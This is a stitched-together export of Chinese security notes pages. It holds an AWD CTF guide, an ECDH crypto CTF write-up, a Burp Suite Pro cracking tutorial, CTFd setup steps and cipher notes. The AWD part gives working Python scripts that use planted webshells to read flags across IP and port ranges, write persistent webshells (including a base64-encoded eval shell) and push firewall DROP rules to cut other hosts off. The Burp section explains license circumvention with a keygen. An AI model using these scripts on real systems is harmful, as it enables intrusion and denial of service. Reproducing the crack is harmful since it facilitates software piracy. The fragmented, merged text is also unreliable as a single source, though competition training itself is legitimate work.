./target.cap : 保存成cap文件，方便用wireshark分析 PHP版流量监控 '.'访问链接：'.'http://'.$ip.$filename.'?'.$parameter.\"\\r\\n\"; // log记录 $fh = fopen(\"log.txt\", \"a\"); fwrite($fh, $logadd); fclose($fh); ?> 一个针对php的web流量抓取、分析的应用：wupco/weblogger 使用方法 cd /var/www/html/ (or other web dir) git clone https://github.com/wupco/weblogger.git chmod -R 777 weblogger/ open http://xxxxx/weblogger/install.php in Web browser install it WAF waf的作用： 1.最重要是分析流量，别人攻击我们的时候，我们可以看到别人的攻击方式。这样的话即使我们找 不到攻击点，非常苦恼的时候，我们就可以分析流量，使用别人的攻击方式。 2.可以直接进行防御，类似于一台防火墙（一般的比赛是不允许使用的，毕竟比赛时间短，就根本绕不过去waf，那比赛就没意思了） 有些比赛是不允许上通用waf的，check机制可能会check到waf过滤的参数，导致宕机，waf部署需要谨慎，还需要注意的是：上完waf检查服务是否可用，部分检查允许使用部分小的waf，会检查页面完整性、服务完整性。 常用的waf使用方法，是用你要保护的文件去包含这个waf.php。比如说，你要保护select.php，那么你就在select.php里面写上一行include './waf.php'或者 require_once('waf.php'); 如果你要保护所有文件，那么就在config这种配置文件里包含waf，因为这种config的文件，一般会被大部分功能页面调用 网上很多waf脚本，这里介绍几个waf项目 1.AWD_PHP_WAF 项目地址：https://github.com/NonupleBroken/AWD_PHP_WAF 使用方法： 使用前先修改config.php内的密码，密码使用sha256加密 上waf： $ find . -path ./waffffff -prune -o -type f -name \"*.php\" -print | xargs sed -i \"s/比如访问 web 目录下的/waffffff/admin.php?password=123456 2.CTF-WAF 项目地址：https://github.com/sharpleung/CTF-WAF 3.awd-watchbird 这是个通防waf，支持流量转发和替换flag 项目地址：https://github.com/leohearts/awd-watchbird 1.打包好好之后直接上传到html目录下，回到终端，在上传的waf目录下，使用命令 php watchbird.php --install /var/www/html 这样就能使每个页面的php代码包含到waf下 2.运行waf 之后，打开我们的web 页面，在任意一个php 页面后面输入?watchbird=ui，就会进入到waf 配置页面然后设置密码(注意：第一次打开需要设置密码) 3.配置好之后就能进入内部网页 4.AoiAWD 项目地址：https://github.com/DasSecurity-HatLab/AoiAWD 使用方法：AoiAWD-萌新的得分利器 下载好，自己去编译或者找编译好的直接用 防御搅屎 在加固阶段，每个堡垒机都有一个Web在运行。而这些站点可能存在相应的漏洞和后门。基本上都会有shell留在隐秘的角落... 所以我们就可以通过前期搜寻到的后门，进行操作。这里直接用linux的防火墙进行关闭即可。 在正常情况下：这样的话就直接把系统的后门全杀掉了。只允许22 80 21端口可以进行访问。 首先开启 22 80 21 iptables -A INPUT -p tcp --dport 80 -j ACCEPT iptables -A INPUT -p tcp --dport 22 -j ACCEPT iptables -A INPUT -p tcp --dport 21 -j ACCEPT 然后关闭 iptables -A INPUT -j DROP 在手动一个个连shell搅shi的话，是非常慢的。于是写了个小脚本。 遍历整个IP段，并将防火墙开启全部屏蔽掉~~ import requests url = \"http://192.168.182\" port='80' shell = \"/shell.php\" passwd = \"a\" payloads = { passwd:\"system(\\'iptables -A INPUT -j DROP');\" } for i in range(1,254): urls = url+\".\"+str(i)+\":\"+port+shell print(urls+\"\\n\") try: res = requests.post(urls,payloads,timeout=1) print(res.text) except: print(\"未找到主机\") 编写批量脚本 以下脚本来自于我比赛时写的垃圾脚本，大佬勿喷。 1.利用后门getflag 单个shell获取flag import requests url=\"http://192.168.182.130/include/shell.php\" passwd=\"admin_ccmd\" payload = {passwd: 'system(\\'cat /f*\\');'} res=requests.post(url,payload) print(res.text) 2.后门批量getflag 针对端口变化利用后门批量获取flag import requests url1=\"http://192.168.182.130:\" url2=\"\" flaglist=[] path=\"/include/shell.php\" passwd=\"admin_ccmd\" #payload = {passwd: 'system(\\'cat /f*\\');'} payload = {passwd: 'system(\\'cat /flag\\');'} i = 0 for url2 in range(8801,8805): url = url1 + str(url2) +path res=requests.post(url,payload) try: print(url1 + str(url2),res.text) # flag存入列表中 flaglist.append(str(res.text)) #print(flaglist[i]) i += 1 except: pass 3.利用后门批量getflag并提交 burp抓包，发现flag以json形式传输 POST /api/flag HTTP/1.1 Host: 192.168.182.130:39999 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/json;charset=utf-8 Authorization: 9ad36c305d6a2d2514434a4c10e7e13f Content-Length: 55 Origin: http://192.168.182.130:39999 Connection: close Referer: http://192.168.182.130:39999/ {\"flag\":\"SL{7a2ecc20361b7a104798b6bba6222b3972e114a2}\"} 编写脚本自动获取flag并提交 # coding: UTF-8 import requests import json url1=\"http://xxxx:\" url2=\"\" flaglist=[] path=\"/include/shell.php\" passwd=\"admin_ccmd\" flagadd=\"http://xxxx:8801/api/flag\" #提交flag的地址 #payload = {passwd: 'system(\\'cat /f*\\');'} payload = {passwd: 'system(\\'cat /flag\\');'} headers={ 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0', } headersflag={ 'Host': 'xxxx', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Content-Type': 'application/json;charset=utf-8', 'Authorization': 'bada82467423a6526d4d25abbe8cc43a', 'Origin': 'http://xxxx', 'Referer': 'http://xxxx/', } i = 0 for url2 in range(8802,8810): url = url1 + str(url2) +path #print(url1 + str(url2)) res=requests.post(url,payload, headers=headers) try: print(url1 + str(url2),res.text) # flag存入列表中 flaglist.append(str(res.text)) #print(flaglist[i]) body = {\"flag\": str(flaglist[i])} res = requests.post(flagadd, headers=headersflag, data=json.dumps(body)) i += 1 except: pass 如果嫌写脚本麻烦，可以把flag存入字典，利用burp爆破，也可以实现批量提交flag。不过大括号{}可能会被编码导致flag错误。 4.利用后门写shell 预留后门可能会被删除，要想持续拿分需要写shell，这里利用命令执行和代码执行来写马 利用命令执行写马 1.Linux下写shell $ echo \"\" > webshell.php $ echo PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOyA/Pg==|base64 -d > webshell.php #base64编码绕过 $ echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps > webshell.php #xxd绕过 2.windows下写shell >echo ^ > webshell.php 利用代码执行写马 ?code=fputs(fopen('./webshell.php.php','w'),''); ?code=file_put_contents('webshell.php.php', ' '); ?code=file_put_contents($_POST[f], $_POST[d]); post: f=webshell.php&d= 然后利用脚本实现 # coding: UTF-8 import requests url = \"http://192.168.182.130:8808\" shell_path = url + \"/include/shell.php\" shell_passwd = \"admin_ccmd\" #利用预留后门 payload = {shell_passwd: 'system(\\'cat /f*\\');'} res = requests.post(shell_path, payload) print(res.text) #payload1利用预留后门上传shell payload1 = {shell_passwd: 'system(\\'echo \"\" > /var/www/html/atkx.php\\');'} res = requests.post(shell_path, payload1) print(\"shell已上传\") #payload2利用预留后门上传shell，并getflag my_shell_path = url + \"/atkx.php\" my_shell_passwd = \"atkx\" payload2 = {my_shell_passwd: 'system(\\'cat /f*\\');'} res = requests.post(my_shell_path, payload2) print(res.text) 批量后门写shell import requests url_head=\"http://192.168.182.130\" for url2 in range(8801,8805): try: url = url_head+\":{}\".format(url2) shell_path = url + \"/include/shell.php\" shell_passwd = \"admin_ccmd\" print(shell_path) #payload1利用预留后门上传shell payload1 = {shell_passwd: 'system(\\'echo \"\" > /var/www/html/atkx1.php\\');'} res = requests.post(shell_path, payload1) print(url + \" shell写入成功！！！！！！！\") # # #payload2通过上传的shell来getflag # my_shell_path = url + \"/atkx1.php\" # my_shell_passwd = \"atkx\" # payload2 = {my_shell_passwd: 'system(\\'cat /flag\\');'} # res = requests.post(my_shell_path, payload2) # print(url,res.text) except: pass 总结 1.预留后门的权限维持特别重要，不要急着拿flag，往后每一轮预留后门都会减少。 2.AWD一般使用的是cms，尽量多收集一些cms的POC和EXP，以备不时之需。 3.防守注意查看日志看别人是怎么攻击自己的，然后尝试攻击其他人，为了干扰别人，可以先打一波流量，混淆视听。 4.检查后门，保证自己的网站上没有d盾可以扫出来的后门，检查计划任务或者可疑进程。 5.比赛一轮大概几分钟，时间比较紧张，需要提高自己的代码审计能力以及自动化脚本的编写能力，实现自动化攻击。 参考文章： https://blog.csdn.net/weixin_43510203/article/details/118519120 https://www.likecs.com/show-306005446.html https://www.anquanke.com/post/id/86984 https://xz.aliyun.com/t/10995 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛wp/蓝桥杯/Crypto/backdoor.html":{"url":"3.网络安全/CTF竞赛wp/蓝桥杯/Crypto/backdoor.html","title":"backdoor","keywords":"","body":"题目描述 无 解题 下载附件得到源代码和代码输出，代码解释如下，： from Crypto.Util.number import * from Crypto.Util.Padding import pad from random import randint from Crypto.Util.strxor import strxor from Crypto.Cipher import AES from hashlib import sha256 from hashlib import md5 flag = b'xxx' def Get_Parameters(): w = getPrime(25) # 生成一个25位的素数w a = getPrime(15) # 生成一个15位的素数a b = getPrime(15) # 生成一个15位的素数b x = getPrime(30) # 生成一个30位的素数x return w, a, b, x def Malicious_ECDH(): w, a, b, x = Get_Parameters() # 获取参数w, a, b, x P = getPrime(512) # 生成一个512位的素数P A = getRandomNBitInteger(30) # 生成一个30位的随机整数作为曲线参数A B = getRandomNBitInteger(40) # 生成一个40位的随机整数作为曲线参数B F = GF(P) E = EllipticCurve(F, [A, B]) # 创建椭圆曲线对象E G = E.random_point() # 在椭圆曲线上随机选择一个点作为基点G k1 = getRandomNBitInteger(50) # 生成一个50位的随机整数作为私钥k1 M1 = k1 * G # 计算公钥M1 = k1 * G Y = x * G t = 1 z = (k1 - w * t) * G + (-a * k1 - b) * Y # 计算z，这是恶意的ECDH计算 k2 = sha256(str(z[0]).encode()).digest()[:6] # 根据z的x坐标生成共享密钥的前6字节 k2 = bytes_to_long(k2) M2 = k2 * G k_rec = getRandomNBitInteger(50) B_ = k_rec * G shared_key1 = k_rec * M2 # 计算发送方共享密钥 shared_key2 = k2 * B_ assert shared_key1 == shared_key2 print((w, a, b, x)) print((A, B, P)) print(G.xy()) print(M1.xy()) print(M2.xy()) print(B_.xy()) return shared_key1 def easy_enc(pt, key): key = md5(str(int(key[0])).encode()).digest() # 使用共享密钥的x坐标生成密钥 cipher = AES.new(key, AES.MODE_ECB) # 创建AES ECB模式加密对象 ct = cipher.encrypt(pad(pt, 16)) # 使用AES加密明文并填充到16字节倍数 print(ct) # 打印密文 key = Malicious_ECDH() # 执行恶意ECDH计算获取共享密钥 easy_enc(flag, key) # 使用共享密钥对明文进行AES加密 ''' 输出结果： (w, a, b, x) = (31889563, 31153, 28517, 763220531) (A, B, P) = (1064988096, 802063264240, 12565302212045582769124388577074506881895777499095598016237085270545754804754108580101112266821575105979557524040668050927829331647411956215940656838233527) G = (359297413048687497387015267480858122712978942384458634636826020013871463646849523577260820163767471924019580831592309960165276513810592046624940283279131, 9290586933629395882565073588501573863992359052743649536992808088692463307334265060644810911389976524008568647496608901222631270760608733724291675910247770) M1 = (10930305358553250299911486296334290816447877698513318419802777123689138630792465404548228252534960885714060411282825155604339364568677765849414624286307139, 7974701243567912294657709972665114029771010872297725947444110914737157017082782484356147938296124777392629435915168481799494053881335678760116023075462921) M2 = (497353451039150377961380023736260648366248764299414896780530627602565037872686230259859191906258041016214805015473019277626331812412272940029276101709693, 8439756863534455395772111050047162924667310322829095861192323688205133726655589045018003963413676473738236408975953021037765999542116607686218566948766462) B_ = (5516900502352630982628557924432908395278078868116449817099410694627060720635892997830736032175084336697081211958825053352950153336574705799801251193930256, 10314456103976125214338213393161012551632498638755274752918126246399488480437083278584365543698685202192543021224052941574332651066234126608624976216302370) ct = b'\\x1a\\xfb\\xa2\\xe1\\x86\\x04\\xfak\\x9a\\xa3\\xd15\\xb8\\x16\\x1d\\xbc\\xa9S\\xf5;\\xfa\\xf1\\x08dn~\\xd4\\x94\\xa4;^*\\xf6\\xd7\\xf10\\xa3\\xe1k`\\x1f-\\xef\\x80\\x16\\x80\\x80\\xe2' 代码流程： 1. `Get_Parameters()`函数：生成四个随机素数作为参数返回：`w, a, b, x` 2. `Malicious_ECDH()`函数：实现了一个恶意的椭圆曲线Diffie-Hellman密钥交换算法。具体流程如下： - 生成椭圆曲线参数：`P, A, B` - 随机选择曲线上的点G - 生成随机私钥k1，并计算公钥M1 = k1 * G - 生成公钥Y = x * G，随机选择比特t，计算z - 生成共享密钥k2，并计算公钥M2 = k2 * G - 随机生成k_rec作为接收方私钥，计算接收方公钥B_ - 确定共享密钥并打印输出 3. `easy_enc()`函数：使用MD5散列共享密钥的x坐标，然后使用AES ECB模式对明文进行加密，并打印输出密文。 ''' 可以看到代码使用的椭圆曲线密码加密计算key和AES加密计算flag，椭圆曲线密码（私钥加密）除了函数随机得出的key1外还计算了一个共享密钥key2，而这个key2是我们可以通过计算得出的，通过这个key2和源代码计算的加密结果ct可以计算出最终的flag。 代码如下： 注：需要安装sagemath库pip install sagemath 但经过尝试，pycharm识别不了sagemath里的这两个方法GF，EllipticCurve 所以我这里是使用sagemath的软件进行计算相关参数Sagemath下载镜像地址： 打开Sagemath notebook： 以下是sagemath代码（语法规则与python完全相同)： (w, a, b, x) = (31889563, 31153, 28517, 763220531) (A, B, P) = (1064988096, 802063264240, 12565302212045582769124388577074506881895777499095598016237085270545754804754108580101112266821575105979557524040668050927829331647411956215940656838233527) G = (359297413048687497387015267480858122712978942384458634636826020013871463646849523577260820163767471924019580831592309960165276513810592046624940283279131, 9290586933629395882565073588501573863992359052743649536992808088692463307334265060644810911389976524008568647496608901222631270760608733724291675910247770) M1 = (10930305358553250299911486296334290816447877698513318419802777123689138630792465404548228252534960885714060411282825155604339364568677765849414624286307139, 7974701243567912294657709972665114029771010872297725947444110914737157017082782484356147938296124777392629435915168481799494053881335678760116023075462921) M2 = (497353451039150377961380023736260648366248764299414896780530627602565037872686230259859191906258041016214805015473019277626331812412272940029276101709693, 8439756863534455395772111050047162924667310322829095861192323688205133726655589045018003963413676473738236408975953021037765999542116607686218566948766462) B_ = (5516900502352630982628557924432908395278078868116449817099410694627060720635892997830736032175084336697081211958825053352950153336574705799801251193930256, 10314456103976125214338213393161012551632498638755274752918126246399488480437083278584365543698685202192543021224052941574332651066234126608624976216302370) ct = b'\\x1a\\xfb\\xa2\\xe1\\x86\\x04\\xfak\\x9a\\xa3\\xd15\\xb8\\x16\\x1d\\xbc\\xa9S\\xf5;\\xfa\\xf1\\x08dn~\\xd4\\x94\\xa4;^*\\xf6\\xd7\\xf10\\xa3\\xe1k`\\x1f-\\xef\\x80\\x16\\x80\\x80\\xe2' F = GF(P) E = EllipticCurve(F, [A, B]) G=E(G) M1=E(M1) M2=E(M2) B_=E(B_) z=M1-w*G-a*x*M1-x*b*G print('z =',z) k2=276004822811606 shared_key2 = k2 * B_ print('shared_key2 =',shared_key2) ''' z = (2920789563659569373163147548402475799176312294208007526555549238616116689537016760237807061726607670926891615111013956193007747857795096909984003496048581 : 10517297501880005702839316775363523598197119104340092276316129735895299215931339984161377716927383514544697252095888746635319905909087037545258917591357583 : 1) shared_key2 = (9751713826770088626736040788378150184071687079840675547785877284335197312359729041753523349743487117150780761756105828674983574764479611594768748239874895 : 2250077606864053092007237232409491862234509553289408945633405821153363755346944630269370109761926800971684134797654522760858880304874610003720749376827378 : 1) ''' 将sagemath得到的两个元组变量中的：改为,，放入python中使用，达到python代码： from Crypto.Util.number import * from Crypto.Util.Padding import pad from random import randint from Crypto.Util.strxor import strxor from Crypto.Cipher import AES from hashlib import sha256 from hashlib import md5 import sagemath (w, a, b, x) = (31889563, 31153, 28517, 763220531) (A, B, P) = (1064988096, 802063264240, 12565302212045582769124388577074506881895777499095598016237085270545754804754108580101112266821575105979557524040668050927829331647411956215940656838233527) G = (359297413048687497387015267480858122712978942384458634636826020013871463646849523577260820163767471924019580831592309960165276513810592046624940283279131, 9290586933629395882565073588501573863992359052743649536992808088692463307334265060644810911389976524008568647496608901222631270760608733724291675910247770) M1 = (10930305358553250299911486296334290816447877698513318419802777123689138630792465404548228252534960885714060411282825155604339364568677765849414624286307139, 7974701243567912294657709972665114029771010872297725947444110914737157017082782484356147938296124777392629435915168481799494053881335678760116023075462921) M2 = (497353451039150377961380023736260648366248764299414896780530627602565037872686230259859191906258041016214805015473019277626331812412272940029276101709693, 8439756863534455395772111050047162924667310322829095861192323688205133726655589045018003963413676473738236408975953021037765999542116607686218566948766462) B_ = (5516900502352630982628557924432908395278078868116449817099410694627060720635892997830736032175084336697081211958825053352950153336574705799801251193930256, 10314456103976125214338213393161012551632498638755274752918126246399488480437083278584365543698685202192543021224052941574332651066234126608624976216302370) ct = b'\\x1a\\xfb\\xa2\\xe1\\x86\\x04\\xfak\\x9a\\xa3\\xd15\\xb8\\x16\\x1d\\xbc\\xa9S\\xf5;\\xfa\\xf1\\x08dn~\\xd4\\x94\\xa4;^*\\xf6\\xd7\\xf10\\xa3\\xe1k`\\x1f-\\xef\\x80\\x16\\x80\\x80\\xe2' # z变量在sagemath中得到 z = (2920789563659569373163147548402475799176312294208007526555549238616116689537016760237807061726607670926891615111013956193007747857795096909984003496048581, 10517297501880005702839316775363523598197119104340092276316129735895299215931339984161377716927383514544697252095888746635319905909087037545258917591357583, 1) # shared_key2变量在sagemath中得到 shared_key2 = (9751713826770088626736040788378150184071687079840675547785877284335197312359729041753523349743487117150780761756105828674983574764479611594768748239874895, 2250077606864053092007237232409491862234509553289408945633405821153363755346944630269370109761926800971684134797654522760858880304874610003720749376827378, 1) k2 = sha256(str(z).encode()).digest()[:6] k2 = bytes_to_long(k2) print(f'k2 = {k2}') # shared_key2 = k2 * B_ print(f'saged_key2 = {shared_key2}') # AES解密过程 key = md5(str(int(shared_key2[0])).encode()).digest() cipher = AES.new(key, AES.MODE_ECB) ct = cipher.decrypt(ct) print(f'flag = {ct}') ''' k2 = 5364609264917 saged_key2 = (9751713826770088626736040788378150184071687079840675547785877284335197312359729041753523349743487117150780761756105828674983574764479611594768748239874895, 2250077606864053092007237232409491862234509553289408945633405821153363755346944630269370109761926800971684134797654522760858880304874610003720749376827378, 1) flag = b'flag{63259ab8-4916-4095-8888-d92c2b003e18}\\x06\\x06\\x06\\x06\\x06\\x06' ''' 代码中出一些变量外，其他代码几乎就是原版照抄！！！ sagemath代码中的z变量表达式就是题目源代码括号拆开带入`M1=k1G`* 最终得到flag：flag{63259ab8-4916-4095-8888-d92c2b003e18} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛wp/赣育杯/Areyubot.html":{"url":"3.网络安全/CTF竞赛wp/赣育杯/Areyubot.html","title":"Areyubot","keywords":"","body":"解题思路 手速题，使用nc连接后按照要求答题， 一共三道题，答完后给出flag 最后给出flag：SangFor{5qgjJc4rPLbNvyN_xB3NPuwUCg94hRMt} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 14:59 "},"3.网络安全/工具/Burp最新版破解.html":{"url":"3.网络安全/工具/Burp最新版破解.html","title":"Burp最新版破解","keywords":"","body":"我们首先需要三个东西 1、你破解的burp所需要的对应java版本，例如最新的2024.2.1版本的burp需要至少java18（我没记错的话），如何下载java并安装，我这里就不多说了，需要注意的是，这里并不需要强制你把java添加到环境变量，因为本文用的是绝对路径的方法写快捷启动。 2、你需要破解的burp版本的jar包，说到这个，有些师傅居然在群里找人发burp原版，靠。。。burp官方专业版下载地址： https://portswigger.net/burp/releases#professional 3、pwn3的注册机包以及某大佬的汉化包(我忘了id，有点长)，不知道啥是pwn3的，请看这篇文章： 你还在去公众号获取各种破解工具？看完这篇不需要了！ 这里我直接把注册机和汉化包下载链接放在后台，回复：240308 ok，准备好以上三个东西，我们开始操作 首先讲windows 我们把burp的jar包，以及注册机，放进同一个文件夹，注意路径不要有空格！ 然后我们右键新建txt文本，命名为你喜欢的名称，把txt后缀更改为vbs，然后使用文本编辑器打开它，填入下列命令： Dim ws, javaPath Set ws = CreateObject(\"WScript.Shell\") ' 这里替换成你的java路径 javaPath = \"C:\\Program Files\\Java21\\bin\\java.exe\" ws.Run \"\"\"\" & javaPath & \"\"\" --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED --add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED -javaagent:BurpLoaderKeygen.jar -javaagent:BurpSuiteChs.jar -javaagent:ja-netfilter.jar -noverify -Dsun.java2d.uiScale=1 -jar burpsuite_pro_v2024.2.1.jar\", 0 你不用管这些命令具体是干啥玩意儿的你只管用，把你的java对应的路径修改了就好，如果你不喜欢汉化，删掉-javaagent:BurpSuiteChs.jar即可。ps：此脚本没有cmd的启动黑框。 然后我们新建另一个vbs用于启动注册机，和上面同样的操作，命令修改为： Dim ws, javaPath Set ws = CreateObject(\"WScript.Shell\") ' 这里替换成你的java路径 javaPath = \"C:\\Program Files\\Java21\\bin\\java.exe\" ws.Run \"\"\"\" & javaPath & \"\"\" -jar BurpLoaderKeygen.jar\", 0 当然了你直接命令行打开也是一样的，我这里只是为了更新版本时重新打开注册机方便一些。 ok我们的准备工作完成，你现在文件夹里应该是这样的： 直接双击打开这俩vbs，你会得到如下两个东西： 接下来请按照图片的步骤，一步一步操作： 成功破解 现在你就可以正常使用burp了，之后的启动直接双击你命名的vbs即可，如果后续burp版本更新了，重复一遍此操作即可（注意你的jar包文件名）。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 14:56 "},"3.网络安全/工具/CTFd靶场搭建.html":{"url":"3.网络安全/工具/CTFd靶场搭建.html","title":"CTFd靶场搭建","keywords":"","body":"一、技术原理 二、前置需求下载安装 1、CTFd git clone https://github.com/CTFd/CTFd.git 2、ctfd-whale git clone https://github.com/glzjin/CTFd-Whale.git 3、frp 1）下载frp wget https://github.com/fatedier/frp/releases/download/v0.51.3/frp_0.51.3_linux_amd64.tar.gz tar -zxvf frp_0.51.3_linux_amd64.tar.gz cd ./frp_0.51.3_linux_amd64 mkdir /etc/frp cp frpc.ini frps.ini /etc/frp/ cp frpc frps /usr/bin/ chmod a+x /usr/bin/frpc /usr/bin/frps 2)添加指令单元快捷启动frps vim /usr/lib/systemd/system/frps.service 填入以下内容 [Unit] Description=frps After=network.target [Service] Type=simple WorkingDirectory=/usr/bin ExecStart=/usr/bin/frps -c /etc/frp/frps.ini Restart=on-failure [Install] WantedBy=multi-user.target 启动frps systemctl daemo-reload systemctl start frps systemctl enable frps 3)编辑配置文件 frps.ini [common] bind_port = 7897 bind_addr = 0.0.0.0 token = randomme # vhost_http_port = 80 # 如果要配置http动态域名则需要这个。80端口开启需要systemd使用root权限启用frp，在这里不需要 frpc.ini [common] token = thisistoken server_addr = 172.17.0.1 # 这里填写服务器ip addr之后docker0的ip地址 server_port = 7897 # 这里需与前面frps.ini的bind_port匹配 admin_addr = 172.1.0.4 # 这里填写frpc服务在frp网络中的ip admin_port = 7400 # 这里需要留至少一行空行，因为新的 Whale 会把容器的转发代理写到这个文件里，没留空行的话会影响 admin_port。 三、安装docker和docker-compose 1、安装docker yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo yum install -y docker-ce systemctl start docker systemctl enable docker 2、安装docker-compose yum install -y python3-pip pip3 install --upgrade pip pip3 install docker-compose chmod +x /usr/local/bin/docker-compose docker-compose --version 3、配置docker镜像加速 容器镜像服务 (aliyun.com) mkdir -p /etc/docker tee /etc/docker/daemon.json 4、配置docker集群 docker swarm init docker node update --label-add name=linux-1 $(docker node ls -q) 四、配置过程 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 14:56 "},"3.网络安全/CTF常见文件头.html":{"url":"3.网络安全/CTF常见文件头.html","title":"CTF常见文件头","keywords":"","body":" 文件类型 文件头 ASCII码 文件尾 JPEG (jpg) FFD8FF \\ ÿØÿ\\ FF D9 PNG (png) 89504E47 \\ .PNG\\ AE 42 60 82 GIF (gif) 47494638 或GIF89A \\ GIF8\\ 00 3B ZIP Archive (zip) 504B0304 \\ PK..\\ 50 4B RAR Archive (rar) 52617221 \\ Rar!\\ bmp 424D \\ BM\\ HTML (html) 68746D6C3E \\ html>\\ Wave (wav) 57415645 \\ WAVE\\ AVI (avi) 41564920 \\ AVI \\ Email [thorough only] (eml) 44656C69766572792D646174653A \\ Delivery-date:\\ Adobe Acrobat (pdf) 255044462D312E \\ %PDF-1.\\ Photoshop (psd) 38425053 \\ 8BPS\\ XML (xml) 3C3F786D6C \\ 2.7版本文件头：03F3 0D0A 3.8版本文件头：550D 0D0A upx脱壳：upx.exe -d 文件路径 uncompyle6 pyc逆向：uncompyle6 -o pcat.py pcat.pyc pyinstxtractor：python pyinstxtractor exe文件 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 15:00 "},"3.网络安全/CTF离谱密码总结.html":{"url":"3.网络安全/CTF离谱密码总结.html","title":"CTF离谱密码总结","keywords":"","body":"零、工具箱总结 在线工具 - Bugku CTF 一、凯撒密码 在线加解密：凯撒(Caesar)加密/解密 - Bugku CTF 在密码学中，凯撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。 下面是明文字母表移回3位的对比：明文字母表 X Y Z A B C D E F G H I J K L M N O P Q R S T U V W密文字母表 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 特定恺撒密码 根据偏移量的不同，还存在若干特定的恺撒密码名称： 偏移量为10：Avocat(A→K) 偏移量为13：ROT13 偏移量为-5：Cassis (K 6) 偏移量为-6：Cassette (K 7) C语言实现 #include #include #define MAX 255 void encode(char str[], int n){ int i, j, k; char min[26]={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'}; char max[26]={'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}; for (i = 0; i = 'a' && str[i] = 'A' && str[i] = 'a' && str[i] = 'A' && str[i] 二、维吉尼亚密码 在线加解密：维吉尼亚加密/解密 - Bugku CTF 维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。 三、字母频率 在线加解密：字母频率在线分析 频率分析法指的是各个字母在文本材料中出现的频率。常被应用于密码学，尤其是可破解古典密码的频率分析。 四、培根密码 在线加解密：培根密码在线加密/解密 培根密码，又名倍康尼密码（英语：Bacon's cipher）是由法兰西斯·培根发明的一种隐写术。实际上就是一种替换密码，根据所给表一一对应转换即可加密解密 。它的特殊之处在于：可以通过不明显的特征来隐藏密码信息，比如大小写、正斜体等，只要两个不同的属性，密码即可隐藏。 五、栅栏密码 在线加解密：栅栏加密/解密 - Bugku CTF 栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话），分为传统型与W型 明文举例：f5-lf5aa9gc9{-8648cbfb4f979c-c2a851d6e5-c} 标准型栅栏数为3加密后：flag{6cb9c256-5fac-4b47-a1ec-59988ff9c8d5} 六、QP(quoted-printable)编码 在线加解密：Quoted-printable在线编码 Quoted-printable 编码可译为“可打印字符引用编码”、“使用可打印字符的编码”，我们收邮件，查看信件原始信息，经常会看到这种类型的编码！ 七、ROT编码 在线加解密：凯撒(Caesar)加密/解密 - Bugku CTF ROT5、ROT13、ROT18、ROT47 编码是一种简单的码元位置顺序替换暗码。此类编码具有可逆性，可以自我解密，主要用于应对快速浏览，或者是机器的读取，而不让其理解其意。 实际就是凯撒密码不同的偏移量 下面分别说说它们的编码方式： ROT5是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。 ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。 ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。 ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考ASCII编码。 八、URL编码 在线编码：Url 编码/解码 - 在线工具 (toolhelper.cn) HTML URL 编码参考手册 (w3school.com.cn) 密文特点：%66%6C%61%67%7B%61%6E%64%20%31%3D%31%7D 九、BrainFuck编码/Ook!密码 在线加解密：Brainfuck/OoK加密解密 - Bugku CTF BrainFuck编码 Brainfuck是一种极小化的计算机语言，它是由Urban 